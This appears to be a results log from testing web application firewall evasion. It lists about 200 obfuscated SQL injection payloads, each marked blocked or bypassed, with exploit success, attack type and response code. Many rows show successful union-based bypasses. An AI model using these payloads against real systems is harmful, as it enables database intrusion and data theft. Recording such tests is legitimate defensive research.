Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1+||%0b!+{a+1}=1=%0b(not~false),Bypassed,No,None,Unknown,0.0211,72.56,No,500
0'<@=1.+||%0b!+{x+(select%0b1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0081,72.56,No,403
0%27||+@<@.%0b||+!%0b{x+(select%0b1)}=1=+(not,Bypassed,Yes,unionAtk,Unknown,0.0217,72.56,No,200
0'<@!=.1+||%0b!+{x+(select%0b1)}=1=+(!%0b{`if`,Blocked,No,None,Unknown,0.0163,72.56,No,403
0%27<@=.1+or+not+{x+(select+1)}=1=+(0),Blocked,No,None,Unknown,0.0108,72.56,No,403
0'<@=1%0bor+!+true=%0b(not+{x%0b(select+1)}=1,Bypassed,No,None,booleanAtk,0.0121,72.56,No,500
0'<@!=.1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(not~0,Bypassed,No,None,Unknown,0.0147,72.56,No,500
0%27<@=1+or+not+{x%0b(select+1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0229,72.56,No,200
0%27<@!=1.+||+not%0b{a%0b1}=1=+(not+{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0272,72.56,No,200
0'<@=.1+or%0b!%7efalse=+(not+{x+(select+1)}=1,Blocked,No,None,booleanAtk,0.026,72.56,No,403
0'<@=1.%0b||%0bnot+1=+(not+{`if`+1}=1),Bypassed,No,None,Unknown,0.0222,72.56,No,500
0%27<@=.1+||+!+{x%0b(select+1)}=1=%0b(!%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0192,72.56,No,200
0%27<@=1.+or+{a+1}=1+like+1+or',Bypassed,No,None,Unknown,0.018,72.56,No,500
0'<@=1.%0b||+not+{x+(select+1)}=1=+(!+,Bypassed,No,None,Unknown,0.0232,72.56,No,500
0'<@=1.+||+!~0=+(!+{a%0b1}=1),Bypassed,No,None,Unknown,0.0291,72.56,No,500
0%27<@=.1%0bor%0bnot+true=+(!%0b{x%0b(select%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0251,72.56,No,200
0%27<@=1.%0b||+not%0b{`if`+1}=1=%0b(not+1),Bypassed,Yes,unionAtk,Unknown,0.024,72.56,No,200
0'<@=1.+or+not+{a+1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.029,72.56,No,500
0%27<@!=1+or+false=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0131,72.56,No,200
0'<@=.1%0bor%0b!+{a%0b1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0196,72.56,No,500
0'<@!=1.+||+not+{`if`%0b1}=1=%0b(not+{x%0b(select,Bypassed,No,None,Unknown,0.0135,72.56,No,500
0'<@=1%0bor%0bnot~0=+(not+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0348,72.56,No,500
0'<@=1.%0b||+not+{x+(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.019,72.56,No,500
0'<@!=1.+or+not%0b{x+(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0176,72.56,No,500
0'<@=.1+||+not%0b{`if`+1}=1=%0b(!%7efalse),Bypassed,No,None,Unknown,0.0142,72.56,No,500
0'||+@<@.+||+!%0b1=+(not+{x%0b,Bypassed,No,None,Unknown,0.0116,72.56,No,500
0'<@=.1+||%0b!+{x+(select+1)}=1=%0b(not+{a,Blocked,No,None,Unknown,0.0115,72.56,No,403
0%27<@!=1.+or%0bnot+{`if`%0b1}=1=+(not%0b{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.006,72.56,No,200
0%27<@!=1.+or+!%0b{a%0b1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0142,72.56,No,200
0%27<@=1%0bor%0bnot%0b{x+(select%0b1)}=1=%0b(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0076,72.56,No,200
0'<@!=1%0b||+!%0b{`if`%0b1}=1=%0b(!~false),Bypassed,No,None,Unknown,0.0136,72.56,No,500
0'<@=1.%0bor%0b!+{a+1}=1=+(!+{a%0b1}=1,Bypassed,No,None,Unknown,0.0139,72.56,No,500
0%27<@!=1%0bor%0bnot+{x+(select+1)}=1=%0b(not~,Bypassed,Yes,unionAtk,Unknown,0.0076,72.56,No,200
0'<@=1.%0bor+not%0b{x%0b(select%0b1)}=1=%0b(not+{`if`,Bypassed,No,None,Unknown,0.0139,72.56,No,500
0'||+@<@%0b||+!%0b{`if`+1}=1=%0b(not+,Bypassed,No,None,Unknown,0.0157,72.56,No,500
0%27<@!=1.+||+not+{x+(select+1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0093,72.56,No,403
0%27<@=.1%0bor+!+{`if`+1}=1=+(!%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0236,72.56,No,200
0'<@!=1+or%0bnot+true=%0b(not+{x%0b(select+1)}=1,Bypassed,No,None,booleanAtk,0.0341,72.56,No,500
0'<@!=1%0b||%0b!+{a+1}=1=+(!+{a+,Bypassed,No,None,Unknown,0.0144,72.56,No,500
0%27<@=1.+or+!%0b{`if`+1}=1=%0b(!+1),Bypassed,Yes,unionAtk,Unknown,0.02,72.56,No,200
0%27<@=.1%0b||%0bfalse=%0b(not+{a+1}=1)%0b||,Bypassed,Yes,unionAtk,Unknown,0.0313,72.56,No,200
0'<@=1+or+not~false=+(false)--+,Blocked,No,None,piggyAtk,0.019,72.56,No,403
0%27<@=1.%0bor%0bnot+{`if`+1}=1=+(0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0378,72.56,No,200
0%27<@=1.+or%0bnot+{`if`%0b1}=1=%0b(not%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0334,72.56,No,200
0%27<@=.1%0bor%0bnot%0b{`if`+1}=1=+(not+1),Bypassed,Yes,unionAtk,Unknown,0.0209,72.56,No,200
0%27<@=1%0bor+{x+(select+1)}=1+like%0b{x%0b(select%0b1)}=1+,Bypassed,Yes,unionAtk,Unknown,0.0188,72.56,No,200
0'<@=1.+||+!%7e0=%0b(!%0b{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0174,72.56,No,500
0%27||%0b1<@.+or%0bnot+true=+(!+{x+,Bypassed,Yes,unionAtk,booleanAtk,0.0191,72.56,No,200
0%27<@=1.+||%0b!%0b{x+(select+1)}=1=%0b(not%0b{x,Blocked,No,None,Unknown,0.0219,72.56,No,403
0%27<@=1+||%0bnot%0b{`if`%0b1}=1=+(not%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0143,72.56,No,200
0%27<@=.1+||%0b!+1=+(!+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0271,72.67,No,200
0%27<@=1.+or+!+{x+(select+1)}=1=+(not+,Blocked,No,None,Unknown,0.01,72.81,No,403
0'<@!=1%0bor%0bnot%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0141,72.84,No,500
0'<@=.1+||+!+{x%0b(select+1)}=1=+(not%0b{`if`,Bypassed,No,None,Unknown,0.0145,72.84,No,500
0%27<@!=.1%0b||+!+{a+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0142,72.56,No,200
0%27<@!=1.+or+!%0b{x+(select%0b1)}=1=+(not%7efalse,Bypassed,Yes,unionAtk,booleanAtk,0.0178,72.56,No,200
0%27<@!=1.+or+not%0b{a+1}=1=%0b(not%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0194,72.56,No,200
0%27<@!=.1%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(!%0b1,Bypassed,Yes,unionAtk,Unknown,0.0212,72.56,No,200
0%27<@!=1.%0b||%0b{a%0b1}=1+like+{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0237,72.56,No,500
0%27<@=1.+or%0bnot%0b{`if`%0b1}=1=+(not%0b1),Bypassed,Yes,unionAtk,Unknown,0.0199,72.56,No,200
0%27<@=1%0b||+{x+(select+1)}=1+like%0b{x%0b(select+1)}=1--,Bypassed,Yes,unionAtk,piggyAtk,0.0124,72.56,No,200
0%27<@=.1+||%0bnot+{a%0b1}=1=%0b(!+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0148,72.56,No,200
0'<@!=.1+||+!%0b{a%0b1}=1=%0b(not%7efalse),Bypassed,No,None,Unknown,0.0182,72.56,No,500
0%27<@=1%0bor+not%0b{x%0b(select+1)}=1=+(!%0btrue,Bypassed,Yes,unionAtk,booleanAtk,0.0159,72.56,No,200
0'<@=1.+or%0bnot~0=+(!%0b{a+1}=1),Bypassed,No,None,Unknown,0.0219,72.56,No,500
0%27<@=1%0b||%0b!+{a+1}=1=%0b(not+true),Bypassed,Yes,unionAtk,Unknown,0.0249,72.56,No,200
0%27<@=1.+or%0bnot+{`if`+1}=1=%0b(not%0b{a%0b,Bypassed,Yes,unionAtk,Unknown,0.0116,72.56,No,200
0%27<@=1.%0b||%0bnot%0b{a+1}=1=%0b(!+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0249,72.56,No,200
0'<@!=.1+||+{`if`%0b1}=1+like+{`if`+1}=1+||%27,Bypassed,No,None,Unknown,0.0135,72.56,No,500
0'<@=1%0b||+!%0b{a+1}=1=+(!%0b{a%0b1}=1,Bypassed,No,None,Unknown,0.0182,72.56,No,500
0'or%0b1<@.%0bor%0b1%0blike%0b{x%0b(select%0b1)}=1+||,Bypassed,No,None,Unknown,0.0202,72.56,No,500
0%27<@=.1+||+true%0blike+{x%0b(select+1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.017,72.56,No,200
0%27<@!=1+||%0b{x%0b(select%0b1)}=1%0blike%0btrue+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0176,72.56,No,200
0%27<@!=1%0b||+!%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0095,72.56,No,200
0%27<@!=1.+or+!+{x+(select%0b1)}=1=+(!+,Blocked,No,None,Unknown,0.0112,72.56,No,403
0'<@!=1.+or%0bnot%7efalse=+(!%0b{a%0b1}=1),Blocked,No,None,booleanAtk,0.0195,72.56,No,403
0'<@=.1+or%0bnot+1=+(!%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0106,72.56,No,500
0'<@=.1+or%0b!%0b{x+(select+1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0146,72.56,No,403
0%27<@=1%0b||+!+{a%0b1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0092,72.56,No,200
0'<@!=.1%0b||%0bnot%0b{`if`%0b1}=1=%0b(not+{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0177,72.56,No,500
0'or%0b@<@.%0bor+not+true=%0b(!+true),Bypassed,No,None,booleanAtk,0.0211,72.56,No,500
0%27<@!=1.%0bor+not+{x%0b(select%0b1)}=1=+(false),Bypassed,Yes,unionAtk,booleanAtk,0.0099,72.56,No,200
0'<@!=1.%0bor+!%0b{x%0b(select+1)}=1=%0b(not%0b,Bypassed,No,None,Unknown,0.0135,72.56,No,500
0%27<@=1.+||+!+true=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0155,72.56,No,200
0%27<@=.1+||%0bnot+{`if`%0b1}=1=+(!+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0212,72.56,No,200
0%27||+1<@.+||+{`if`%0b1}=1+like%0b1+or',Bypassed,No,None,Unknown,0.013,72.56,No,500
0'<@=1.%0b||%0bnot+{x+(select%0b1)}=1=%0b(not+{a,Bypassed,No,None,Unknown,0.0104,72.56,No,500
0%27<@!=.1+or%0b!+{x+(select%0b1)}=1=%0b(not+{x,Blocked,No,None,Unknown,0.0102,72.56,No,403
0%27<@!=1+or+!+{x%0b(select+1)}=1=+(not~false,Bypassed,Yes,unionAtk,booleanAtk,0.0115,72.56,No,200
0'<@=1.%0bor+{x+(select+1)}=1%0blike+{x+(select%0b1)}=1%0b,Bypassed,No,None,Unknown,0.025,72.56,No,500
0'<@=1+or+!+{`if`+1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0175,72.56,No,500
0'<@!=.1%0bor%0bnot+{x+(select+1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0174,72.56,No,500
0%27<@!=1.+||+!+{a+1}=1=%0b(not~0),Bypassed,Yes,unionAtk,Unknown,0.0163,72.56,No,200
0%27<@!=1+or%0bnot%0b{x+(select+1)}=1=%0b(!%0b{`if`,Blocked,No,None,Unknown,0.0127,72.56,No,403
0%27<@=.1%0b||%0bnot+{x+(select%0b1)}=1=%0b(not%7efalse,Bypassed,Yes,unionAtk,Unknown,0.0111,72.56,No,200
0%27<@!=.1%0bor%0b!+{`if`%0b1}=1=%0b(false)%23,Bypassed,Yes,unionAtk,piggyAtk,0.016,72.56,No,200
0%27<@!=1+||+not%0b{x%0b(select+1)}=1=%0b(!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.024,72.56,No,200
0%27<@=1%0bor+!+{`if`%0b1}=1=+(not~0),Bypassed,Yes,unionAtk,Unknown,0.0105,72.56,No,200
0'||+!@<@.%0bor+not+{a%0b1}=1=%0b(!%0b,Bypassed,No,None,Unknown,0.0229,72.56,No,500
0%27<@!=1.+or%0bnot~false=+(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0171,72.56,No,200
0'<@!=.1%0bor%0b!+{a%0b1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.0141,72.56,No,500
0%27<@=1%0bor+not%0b{x%0b(select+1)}=1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0225,72.56,No,200
0'<@!=1.+or+!+{x+(select%0b1)}=1=+(!%0b{`if`,Blocked,No,None,Unknown,0.013,72.56,No,403
0%27<@!=1%0bor+false=+(false)%0b||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0232,72.56,No,200
0%27<@=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0179,72.56,No,200
0'<@=1.+||%0b!+{x+(select%0b1)}=1=+(not%0b,Blocked,No,None,Unknown,0.0094,72.56,No,403
0'<@!=1.+||+not%0b1=%0b(not%0b{x+(select%0b,Bypassed,No,None,Unknown,0.0156,72.56,No,500
0'<@=1.+||+!+{x%0b(select+1)}=1=%0b(not%7e0,Bypassed,No,None,Unknown,0.0117,72.56,No,500
0'<@=.1+or+not+{x%0b(select%0b1)}=1=%0b(not%7efalse,Bypassed,No,None,booleanAtk,0.0189,72.56,No,500
0%27<@=.1+or%0b0=+(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.018,72.56,No,403
0%27<@=1.+or%0bnot+{x+(select+1)}=1=+(not%0b{`if`,Blocked,No,None,Unknown,0.0105,72.56,No,403
0'<@=.1%0bor+{a%0b1}=1+like+{x%0b(select+1)}=1%0bor%27,Bypassed,No,None,Unknown,0.0245,72.56,No,500
0%27<@!=1+or+!%0b{`if`+1}=1=%0b(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0221,72.56,No,200
0'<@=1.+||%0bnot+{x+(select+1)}=1=+(not%0b{`if`,Blocked,No,None,Unknown,0.0225,72.56,No,403
0%27<@=1+or+not%0b{x+(select%0b1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0202,72.56,No,200
0'<@!=.1+||%0bnot+{a+1}=1=%0b(!+{x+,Bypassed,No,None,Unknown,0.0197,72.56,No,500
0%27<@!=.1+||%0b!+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0302,72.56,No,200
0%27<@!=1+||%0bnot%0b{`if`+1}=1=+(not+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0293,72.56,No,200
0'<@=1.%0bor+!%0b{x%0b(select+1)}=1=+(not%0b,Bypassed,No,None,Unknown,0.0156,72.56,No,500
0'<@=1.%0bor%0b!%0b{a+1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Unknown,0.0181,72.56,No,500
0'<@=1%0bor+not+{`if`%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Unknown,0.0168,72.56,No,500
0'<@=1%0b||%0bnot~0=%0b(!%0b{a%0b1}=1),Bypassed,No,None,Unknown,0.0155,72.56,No,500
0'<@!=.1%0b||+!%0b{x%0b(select+1)}=1=%0b(false),Bypassed,No,None,Unknown,0.0266,72.67,No,500
0'<@!=1%0bor+not+{a+1}=1=%0b(!%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.03,72.8,No,500
0%27<@!=.1+||+!+{x+(select+1)}=1=+(!%0b,Blocked,No,None,Unknown,0.0116,72.84,No,403
0%27<@=1+||+!%7efalse=%0b(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0117,72.84,No,200
0'<@=1.%0bor%0b!+{a+1}=1=+(!+{x+,Bypassed,No,None,Unknown,0.0081,72.84,No,500
0%27<@=1.%0bor+!%0b{a%0b1}=1=%0b(not%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0109,72.84,No,200
0'<@=1+or+not%0b{a%0b1}=1=+(not%7e0),Bypassed,No,None,Unknown,0.0245,72.84,No,500
0%27<@=1.+or+not~false=%0b(!%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0263,72.84,No,200
0'<@=.1+or+not+{`if`%0b1}=1=+(!+true),Bypassed,No,None,booleanAtk,0.03,72.84,No,500
0'<@!=1%0bor+not+{x%0b(select+1)}=1=+(not+,Bypassed,No,None,Unknown,0.0141,72.84,No,500
0%27<@=.1+or+!+{`if`%0b1}=1=+(false)+||,Bypassed,Yes,unionAtk,booleanAtk,0.0145,72.84,No,200
0'<@!=1%0bor%0bnot+1=+(!+{x%0b(select+,Bypassed,No,None,Unknown,0.0212,72.84,No,500
0%27<@=.1%0bor+not%0b{`if`%0b1}=1=+(not+1),Bypassed,Yes,unionAtk,Unknown,0.0274,72.84,No,200
0'<@=1%0bor%0b!%0b1=%0b(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0116,72.84,No,500
0'<@!=1+||%0bnot+{x+(select+1)}=1=%0b(!%0b,Blocked,No,None,Unknown,0.0103,72.84,No,403
0'<@!=1+||%0b!%0b{x%0b(select%0b1)}=1=+(!+{x,Blocked,No,None,Unknown,0.0128,72.84,No,403
0%27<@=1.%0bor+!+{a%0b1}=1=+(!+1),Bypassed,Yes,unionAtk,Unknown,0.0187,72.84,No,200
0%27<@=1+or%0b!+{a+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0186,72.84,No,200
0'<@!=1.+or+not~false=%0b(!%0b{x+(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0115,72.84,No,500
0'<@!=1%0b||+not+true=%0b(!%0b{a%0b1}=1),Bypassed,No,None,Unknown,0.0199,72.84,No,500
0%27<@=1%0b||%0bnot+{`if`+1}=1=%0b(!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.025,72.84,No,200
0%27<@=1.%0b||+not+{a%0b1}=1=+(!~false),Bypassed,Yes,unionAtk,Unknown,0.0091,72.84,No,200
0'<@!=1+||%0b{a+1}=1+like+{x%0b(select+1)}=1+or%27,Bypassed,No,None,Unknown,0.0105,72.84,No,500
0%27<@=1.%0bor+not+{`if`%0b1}=1=+(not+1),Bypassed,Yes,unionAtk,Unknown,0.0125,72.84,No,200
0'<@!=1%0b||+!+{x%0b(select+1)}=1=%0b(not+,Bypassed,No,None,Unknown,0.0142,72.84,No,500
0%27<@!=1.+or%0b!+{`if`+1}=1=%0b(not+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0125,72.84,No,200
0'<@=1.%0bor+false=+(not+{`if`%0b1}=1)+or,Bypassed,No,None,booleanAtk,0.0148,72.84,No,500
0%27<@=.1+||%0b!+{a%0b1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0079,72.84,No,200
0%27<@!=.1%0b||+not+{x+(select+1)}=1=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.013,72.84,No,200
0%27<@=.1%0b||+not%7efalse=%0b(not%0btrue)%0bor,Bypassed,Yes,unionAtk,booleanAtk,0.0176,72.84,No,200
0'<@=1.%0b||%0b!+{x+(select%0b1)}=1=+(not%0b{a,Bypassed,No,None,Unknown,0.008,72.84,No,500
0'<@!=.1%0bor+not+{x+(select%0b1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.0196,72.84,No,500
0%27<@!=1.%0b||%0bnot+{`if`+1}=1=%0b(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0132,72.56,No,200
0'<@!=1.+or+true+like+{`if`%0b1}=1%0bor%27,Bypassed,No,None,booleanAtk,0.0209,72.56,No,500
0%27<@!=1.+||+!%0b{a%0b1}=1=+(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0221,72.56,No,200
0'<@!=.1+||+!+true=+(not%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0135,72.56,No,500
0%27<@!=1+or+!+{x%0b(select%0b1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.02,72.56,No,200
0%27<@=1.%0bor+not+true=+(not%0btrue)+or,Bypassed,Yes,unionAtk,booleanAtk,0.012,72.56,No,200
0%27<@=1.%0bor%0bnot%0btrue=+(!%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0136,72.56,No,200
0%27<@!=1.%0bor+not+{`if`%0b1}=1=%0b(not%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0298,72.56,No,200
0%27<@!=1%0b||+!+{x%0b(select+1)}=1=%0b(not%0b1,Bypassed,Yes,unionAtk,Unknown,0.0247,72.56,No,200
0'<@!=.1+or%0bnot+{x%0b(select+1)}=1=%0b(!%0b,Bypassed,No,None,Unknown,0.0181,72.56,No,500
0'<@=1.%0bor%0b!%7efalse=+(!+{`if`%0b1}=1),Bypassed,No,None,booleanAtk,0.019,72.56,No,500
0%27<@=.1+||+not%0b{x+(select%0b1)}=1+is+false%0b||,Bypassed,Yes,unionAtk,Unknown,0.0259,72.56,No,200
0%27<@=.1%0b||%0b!+{a+1}=1=%0b(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0123,72.56,No,200
0%27<@!=1+or+not%0b{x+(select+1)}=1=%0b(false),Bypassed,Yes,unionAtk,booleanAtk,0.013,72.56,No,200
0%27<@=1.+||+not%7efalse=%0b(!%0b{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0194,72.56,No,200
0'<@!=1%0b||+!+{a+1}=1=+(!+{a+1}=1,Bypassed,No,None,Unknown,0.0154,72.56,No,500
0%27<@!=.1%0b||%0b!~false=%0b(!+1)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0219,72.56,No,200
0'<@=1.+||%0b!+1=+(not+{a%0b1}=1),Bypassed,No,None,Unknown,0.0151,72.56,No,500
0%27or+@<@.+||+{x%0b(select+1)}=1%0blike+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0116,72.56,No,200
0%27<@!=1.%0b||+!%0btrue=%0b(!%0b{`if`%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.0383,72.7,No,200
0'<@!=1%0bor%0b!+1=%0b(not%0b{`if`%0b1}=1),Bypassed,No,None,Unknown,0.026,72.84,No,500
0%27<@=.1+or+{`if`+1}=1%0blike+{`if`%0b1}=1%0b||',Bypassed,No,None,Unknown,0.0147,72.84,No,500
0%27<@!=1.%0bor%0b!%0b{x+(select%0b1)}=1=+(!+{a,Bypassed,Yes,unionAtk,Unknown,0.022,72.84,No,200
0'<@=1.+or+!%7e0=%0b(!~false)--+,Blocked,No,None,piggyAtk,0.0134,72.84,No,403
0'<@!=.1%0b||+!+{`if`+1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0224,72.84,No,500
0'<@!=1.%0b||%0bnot+{x+(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0122,72.84,No,500
0'<@=.1%0bor+!+{a%0b1}=1=%0b(not%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0106,72.84,No,500
0%27<@!=.1%0bor%0bnot%0b{a+1}=1=+(not+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0189,72.84,No,200
0'<@!=1+||%0b!+{x%0b(select+1)}=1=+(not%0btrue,Bypassed,No,None,Unknown,0.0157,72.84,No,500
0'<@!=1.+||+not+{`if`%0b1}=1=+(not+{x+(select,Bypassed,No,None,Unknown,0.0353,72.84,No,500
0%27<@!=1.%0bor+not%0b{x+(select%0b1)}=1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,72.84,No,200
0%27<@!=1+or+!+{a%0b1}=1=+(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0119,72.84,No,200
0%27<@=1+||+not%0b{`if`+1}=1=%0b(not+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0187,72.84,No,200
0'<@!=.1+||%0b{a+1}=1+like+{`if`+1}=1+or%27,Bypassed,No,None,Unknown,0.012,72.84,No,500
0%27<@=1%0bor+!%0b{a%0b1}=1=%0b(!~false),Bypassed,Yes,unionAtk,booleanAtk,0.0204,72.84,No,200
0'<@!=1.+||+not%0b{x+(select+1)}=1=%0b(not+,Bypassed,No,None,Unknown,0.0099,72.84,No,500
0'<@=1+||%0b!%0btrue=%0b(!%0b{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0157,72.84,No,403
0%27<@!=1.+or+!+{`if`+1}=1=+(not%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0286,72.84,No,200
0%27<@=1+or+not+{x+(select+1)}=1=%0b(!+true,Blocked,No,None,booleanAtk,0.0139,72.84,No,403
0%27<@!=1.%0bor+{x+(select%0b1)}=1+like+{x+(select+1)}=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0211,72.84,No,200
0%27||%0b!@<@.+or%0b!~0=%0b(not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0225,72.84,No,200
0%27<@!=1.+||%0b!%0b{x%0b(select+1)}=1=%0b(not%7efalse,Bypassed,Yes,unionAtk,Unknown,0.0162,72.84,No,200
0'<@=1.+or%0b!+{a%0b1}=1=%0b(not+{x%0b(select,Bypassed,No,None,Unknown,0.0129,72.84,No,500
0'<@!=1%0bor+not+{x%0b(select%0b1)}=1=%0b(not%0b,Bypassed,No,None,Unknown,0.0152,72.84,No,500
0'<@!=1%0bor%0b!~false=%0b(!+{x%0b(select%0b,Bypassed,No,None,booleanAtk,0.0073,72.84,No,500
0%27<@=1+or+!+{`if`%0b1}=1=+(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0141,72.84,No,200
0'<@!=1.+||%0b{`if`%0b1}=1+like%0b{x%0b(select+1)}=1--+,Bypassed,No,None,piggyAtk,0.0132,72.84,No,500
0%27<@!=.1%0bor+not%7efalse=%0b(not%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0135,72.84,No,200
0%27<@=.1%0b||%0b!+{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0173,72.84,No,200
0'or%0b@<@.+||+!%0b{x%0b(select%0b1)}=1=%0b(not,Bypassed,No,None,Unknown,0.0263,72.84,No,500
0%27<@=.1+or%0bnot%0b{x+(select+1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.011,72.56,No,403
